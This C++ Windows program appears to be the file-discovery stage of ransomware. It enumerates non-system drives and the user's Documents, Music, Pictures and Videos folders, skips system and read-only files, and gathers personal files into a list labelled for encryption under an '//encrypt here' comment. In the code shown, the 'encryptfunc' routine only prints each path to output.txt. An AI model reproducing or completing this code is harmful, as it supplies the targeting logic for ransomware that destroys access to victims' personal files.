#include <bits/stdc++.h>
#include <windows.h>
#include <Shlobj.h>
using namespace std;

inline void wide_char_to_mb(WCHAR* input, char* output, int outputbuf) {
	WideCharToMultiByte(CP_UTF8, 0, input, -1, output, outputbuf, NULL, NULL);
}

inline void mb_to_wide_char(char* input, WCHAR* output, int outputbuf) {
	MultiByteToWideChar(CP_UTF8, 0, input, -1, output, outputbuf);
}

int encryptfunc(const std::wstring& wstr, const char *prepend) {
    char *str;
    int utf8strlen = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    str = new char[utf8strlen+3];
    utf8strlen = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, str, utf8strlen, NULL, NULL);
    printf("%s%s\n", prepend, str);
    delete[] str;
    return 0;
}


vector<wstring> findTargetLocation() {
    DWORD AvailableDrive = GetLogicalDrives();
    vector<wstring> ret;
    //Get drive, exclude A: B: C: 

    for(int i=3; i < 26; i++) {
        if( (AvailableDrive >> i) & 1 ) {
            wstring tmp;
            tmp.push_back(L'A'+i);
            tmp += L":\\*";
            ret.push_back(tmp);
        }
    }
    

    //Get special location
    HRESULT shret;
    PWSTR retpath;
    const GUID specialTargetList[] = {FOLDERID_Documents, FOLDERID_Music, FOLDERID_Pictures, FOLDERID_Videos, 
                                        FOLDERID_PublicDocuments, FOLDERID_PublicMusic, FOLDERID_PublicPictures, FOLDERID_PublicVideos};
    for(auto& specialItem : specialTargetList) {
        shret = SHGetKnownFolderPath(specialItem, 0, NULL, &retpath);
        std::wstring twstr = std::wstring(retpath) + L"\\*";
        if(shret == S_OK) ret.push_back(twstr);
        CoTaskMemFree(retpath);
    }

    return ret;
}

int fileFetcher(bool safeMode=true) {
    //target already contain asterisk wildcard
    vector<wstring> targetLocation = findTargetLocation();
    queue<wstring> q;
    for(auto& tmp:targetLocation) q.push(tmp);

    while(!q.empty()) {
        wstring path = q.front();
        q.pop();
        (void) encryptfunc(path, "DIR: ");

        vector<wstring> encryptlist, deeperdirlist;

        _WIN32_FIND_DATAW filedata;
        HANDLE findfilehandle = FindFirstFileW(path.c_str(), &filedata);
        if(findfilehandle == INVALID_HANDLE_VALUE) {
            fprintf(stderr, "error!");
            return -1;
        }
        do {
            if(wcscmp(filedata.cFileName, L"nodectest") == 0) {
                encryptlist.clear();
                deeperdirlist.clear();
                goto contlabel;
            }

            //filter current and previous directory 
            if(wcscmp(filedata.cFileName, L".") == 0 || wcscmp(filedata.cFileName, L"..") == 0) {
                //do not touch
            } else
            //check system file
            if( filedata.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM ||
                filedata.dwFileAttributes & FILE_ATTRIBUTE_ENCRYPTED ||
                filedata.dwFileAttributes & FILE_ATTRIBUTE_READONLY || 
                filedata.dwFileAttributes & FILE_ATTRIBUTE_TEMPORARY ||
                filedata.dwFileAttributes & FILE_ATTRIBUTE_DEVICE ||
                filedata.dwFileAttributes & FILE_ATTRIBUTE_OFFLINE ||
                filedata.dwFileAttributes & FILE_ATTRIBUTE_ENCRYPTED ||
                filedata.dwFileAttributes & FILE_ATTRIBUTE_VIRTUAL
            ) {
                //do not touch
            } else if(filedata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                wstring fullpath = path;
                fullpath.pop_back();    //pop asterisk wildcard;
                fullpath = fullpath + std::wstring(filedata.cFileName) + L"\\*";
                deeperdirlist.push_back(fullpath);
            } else if(
                filedata.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE ||
                filedata.dwFileAttributes & FILE_ATTRIBUTE_COMPRESSED ||
                filedata.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN || 
                filedata.dwFileAttributes & FILE_ATTRIBUTE_NORMAL
            ) {
                wstring fullpath = path;
                fullpath.pop_back();    //pop asterisk wildcard;
                fullpath += std::wstring(filedata.cFileName);
                encryptlist.push_back(fullpath);
            }
        } while(FindNextFileW(findfilehandle, &filedata) != 0);

        //encrypt here
        for(auto& wstr:encryptlist) {
            (void) encryptfunc(wstr, "");
        }

        //push deeper here
        for(auto& wstr:deeperdirlist) {
            q.push(wstr);
        }

        contlabel:
        continue;
    }

    return 0;
}

int main() {
    freopen("output.txt", "w", stdout);
    return fileFetcher();
}